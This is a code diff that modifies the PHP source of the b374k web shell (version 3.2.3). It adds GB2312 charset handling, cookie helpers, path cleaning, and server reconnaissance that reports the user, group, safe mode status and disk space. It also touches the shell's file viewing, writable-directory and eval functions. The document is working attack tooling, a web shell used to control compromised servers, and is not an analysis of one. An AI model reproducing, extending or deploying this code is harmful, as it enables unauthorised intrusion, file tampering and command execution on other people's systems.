@@ -2,6 +2,8 @@
 $GLOBALS['ver'] = "3.2.3";
 $GLOBALS['title'] = "b374k";
 
+if(!defined('DETECT_SYS_CHARSET')) define('DETECT_SYS_CHARSET', DIRECTORY_SEPARATOR == '\\'?'gb2312':'utf-8');
+
 @ob_start();
 error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
 @ini_set('html_errors','0');
@@ -28,7 +30,7 @@ if(!function_exists('auth')){
 				$res = "<!doctype html>
 		<html>
 		<head>
-		<meta charset='utf-8'>
+		<meta charset='".DETECT_SYS_CHARSET."'>
 		<meta name='robots' content='noindex, nofollow, noarchive'>
 		<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'>
 		</head>
@@ -48,28 +50,187 @@ if(!function_exists('auth')){
 	}
 }
 
+if (!function_exists('set_cookie')) {
+	function set_cookie($key, $val) {
+		setcookie($key, urlencode($val));
+	}
+}
+
+if (!function_exists('get_cookie')) {
+	function get_cookie($key) {
+		$_COOKIE = fix_magic_quote($_COOKIE);
+		if ($key) {
+			return isset($_COOKIE[$key]) ? $_COOKIE[$key] : '';
+		} else {
+			return $_COOKIE;
+		}
+	}
+}
+
+if (!function_exists('convert_string_to_utf8')) {
+	function convert_string_to_utf8($str = '') {
+		return @mb_convert_encoding($str, 'UTF-8', 'GB2312');
+	}
+}
+
+if (!function_exists('convert_string_to_sys')) {
+	function convert_string_to_sys($str = '') {
+		return @mb_convert_encoding($str, 'GB2312', 'UTF-8');
+	}
+}
+
+
+if (!function_exists('clean_path')) {
+	function clean_path($path) {
+		$path = trim($path);
+		$path = trim($path, '\\/');
+		$path = str_replace(array('../', '..\\'), '', $path);
+		if ($path == '..') {
+			$path = '';
+		}
+		return str_replace('\\', '/', $path);
+	}
+}
+
+if (!function_exists('get_parent_path')) {
+	function get_parent_path($path) {
+		$path = clean_path($path);
+		if ($path != '') {
+			$array = explode('/', $path);
+			if (count($array) > 1) {
+				$array = array_slice($array, 0, -1);
+				return implode('/', $array);
+			}
+			return '';
+		}
+		return false;
+	}
+}
+
+if (!function_exists('viewSize')) {
+	function viewSize($s) {
+		if ($s >= 1073741824) {
+			return sprintf('%1.2f', $s / 1073741824) . ' GB';
+		} elseif ($s >= 1048576) {
+			return sprintf('%1.2f', $s / 1048576) . ' MB';
+		} elseif ($s >= 1024) {
+			return sprintf('%1.2f', $s / 1024) . ' KB';
+		} else {
+			return $s . ' B';
+		}
+
+	}
+}
+
+if (!function_exists('perms')) {
+	function perms($p) {
+		if (($p & 0xC000) == 0xC000) {
+			$i = 's';
+		} elseif (($p & 0xA000) == 0xA000) {
+			$i = 'l';
+		} elseif (($p & 0x8000) == 0x8000) {
+			$i = '-';
+		} elseif (($p & 0x6000) == 0x6000) {
+			$i = 'b';
+		} elseif (($p & 0x4000) == 0x4000) {
+			$i = 'd';
+		} elseif (($p & 0x2000) == 0x2000) {
+			$i = 'c';
+		} elseif (($p & 0x1000) == 0x1000) {
+			$i = 'p';
+		} else {
+			$i = 'u';
+		}
+
+		$i .= (($p & 0x0100) ? 'r' : '-');
+		$i .= (($p & 0x0080) ? 'w' : '-');
+		$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
+		$i .= (($p & 0x0020) ? 'r' : '-');
+		$i .= (($p & 0x0010) ? 'w' : '-');
+		$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
+		$i .= (($p & 0x0004) ? 'r' : '-');
+		$i .= (($p & 0x0002) ? 'w' : '-');
+		$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
+		return $i;
+	}
+}
+
+if (!function_exists('viewPermsColor')) {
+	function viewPermsColor($f) {
+		if (!@is_readable($f)) {
+			return '<font color=#FF0000><b>' . perms(@fileperms($f)) . '</b></font>';
+		} elseif (!@is_writable($f)) {
+			return '<font color=white><b>' . perms(@fileperms($f)) . '</b></font>';
+		} else {
+			return '<font color=#FFDB5F><b>' . perms(@fileperms($f)) . '</b></font>';
+		}
+
+	}
+}
+
 if(!function_exists('get_server_info')){
 	function get_server_info(){
-		$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
-		$server_info['ip_adrress'] = "Server IP : ".$server_addr." <span class='strong'>|</span> Your IP : ".$_SERVER['REMOTE_ADDR'];
-		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time());
-		$server_info['uname'] = php_uname();
-		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
-		$server_info['software'] = $server_software."  PHP ".phpversion();		
+		$freeSpace = @diskfreespace($GLOBALS['cwd']);
+		$totalSpace = @disk_total_space($GLOBALS['cwd']);
+		$totalSpace = $totalSpace ? $totalSpace : 1;
+		// added by xqbumu
+		if (!function_exists('posix_getegid')) {
+			$user = @get_current_user();
+			$uid = @getmyuid();
+			$gid = @getmygid();
+			$group = "?";
+		} else {
+			$uid = @posix_getpwuid(@posix_geteuid());
+			$gid = @posix_getgrgid(@posix_getegid());
+			$user = $uid['name'];
+			$uid = $uid['uid'];
+			$group = $gid['name'];
+			$gid = $gid['gid'];
+		}
+		$server_addr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : $_SERVER["HTTP_HOST"];
+		$server_info['uname'] = "Uname : " . php_uname();
+		$server_info['user'] = "User : " . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' ) ';
+		$server_info['php'] = "PHP : " . @phpversion() . ' <span>Safe mode:</span> ' . (isset($GLOBALS['safe_mode']) && $GLOBALS['safe_mode'] ? '<font color=red>ON</font>' : '<font color=#FF005F><b>OFF</b></font>') . ' <a href=#!info>[ phpinfo ]</a> <span>Datetime <span class=\'strong\'>@</span> Server:</span> ' . date('Y-m-d H:i:s');
+		$server_info['hdd'] = "HDD : " . viewSize($totalSpace) . ' <span>Free:</span> ' . viewSize($freeSpace) . ' (' . round(100 / ($totalSpace / $freeSpace), 2) . '%)';
+		$server_info['ip_adrress'] = "Server IP : " . $server_addr . " <span class='strong'>|</span> Your IP : " . $_SERVER['REMOTE_ADDR'];
+		$server_software = (getenv('SERVER_SOFTWARE') != '') ? getenv('SERVER_SOFTWARE') . " <span class='strong'>|</span> " : '';
+		$server_info['software'] = $server_software . "  PHP " . phpversion();
 		return $server_info;
+	}
+}
+
+if (!function_exists('get_server_info_html')) {
+	function get_server_info_html() {
+		$server_info_html = '';
+		foreach (get_server_info() as $k => $v) {
+			$server_info_html .= "<div>" . $v . "</div>";
+		}
+		return $server_info_html;
 	}
 }
 
 if(!function_exists('get_self')){
 	function get_self(){
 		$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
-		return html_safe($_SERVER["REQUEST_URI"].$query);
+		if (strpos($_SERVER["REQUEST_URI"], $query)) {
+			return html_safe($_SERVER["REQUEST_URI"]);
+		} else {
+			return html_safe($_SERVER["REQUEST_URI"].$query);
+		}
 	}
 }
 
 if(!function_exists('get_post')){
 	function get_post(){
-		return fix_magic_quote($_POST);
+		$recode_keys = array('cd', 'viewFile', 'newFile', 'editFilename', 'delete', 'renameFile', 'renameFileTo',
+			'newFolder');
+		$res = fix_magic_quote($_POST);
+		foreach($res as $k => $v) {
+			if(in_array($k, $recode_keys)) {
+				$res[$k] = convert_string_to_sys($v);
+			}
+		}
+		return $res;
 	}
 }
 
@@ -83,12 +244,12 @@ if(!function_exists('get_cwd')){
 	function get_cwd(){
 		$cwd = getcwd().DIRECTORY_SEPARATOR;
 		if(!isset($_COOKIE['cwd'])){
-			setcookie("cwd", $cwd);
+			set_cookie("cwd", $cwd);
 		}
 		else{
 			$cwd_c = rawurldecode($_COOKIE['cwd']);
 			if(is_dir($cwd_c)) $cwd = realpath($cwd_c).DIRECTORY_SEPARATOR;
-			else setcookie("cwd", $cwd);
+			else set_cookie("cwd", $cwd);
 		}
 		return $cwd;
 	}
@@ -219,7 +380,7 @@ if(!function_exists('parse_dir')){
 		for($i = 0; $i < sizeof($paths)-1; $i++){
 			$x = "";
 			for($j = 0; $j <= $i; $j++) $x .= $paths[$j].DIRECTORY_SEPARATOR;
-			$res .= "<a class='navbar' data-path='".html_safe($x)."'>".html_safe($paths[$i])." ".DIRECTORY_SEPARATOR." </a>";
+			$res .= "<a class='navbar' data-path='".html_safe($x)."'>".html_safe($paths[$i]).DIRECTORY_SEPARATOR."</a>";
 		}
 		if(is_win()) $res = get_drives().$res;
 		return trim($res);
@@ -496,7 +657,7 @@ if(!function_exists('view_file')){
 	function view_file($file, $type, $preserveTimestamp='true'){
 		$output = "";
 		if(is_file($file)){
-			$dir = dirname($file);
+			$dir = get_parent_path($file);
 
 			$owner = "";
 			if(!is_win()){
@@ -622,7 +783,7 @@ if(!function_exists('get_writabledir')){
 
 			$tempfile = tempnam(__FILE__,'');
 			if(file_exists($tempfile)){
-				$dir = realpath(dirname($tempfile)).DIRECTORY_SEPARATOR;
+				$dir = realpath(get_parent_path($tempfile)).DIRECTORY_SEPARATOR;
 				unlink($tempfile);
 				return $dir;
 			}
@@ -638,7 +799,7 @@ if(!function_exists('get_drives')){
 		$v = $v[0];
 		foreach (range("A", "Z") as $letter){
 			if(@is_readable($letter.":\\")){
-				$drives .= "<a class='navbar' data-path='".$letter.":\\'>[ ";
+				$drives .= "<a class='navbar' data-path='".$letter.":\\"."'>[ ";
 				if($letter.":" != $v) $drives .= $letter;
 				else{$drives .= "<span class='drive-letter'>".$letter."</span>";}
 				$drives .= " ]</a> ";
@@ -975,10 +1136,10 @@ if(!function_exists('eval_go')){
 }
 
 if(!function_exists('output')){
-	function output($str){
+	function output($str, $charset=DETECT_SYS_CHARSET){
 		$error = @ob_get_contents();
 		@ob_end_clean();
-		header("Content-Type: text/plain");
+		header("Content-Type: text/plain;charset=".$charset);
 		header("Cache-Control: no-cache");
 		header("Pragma: no-cache");
 		echo $str;
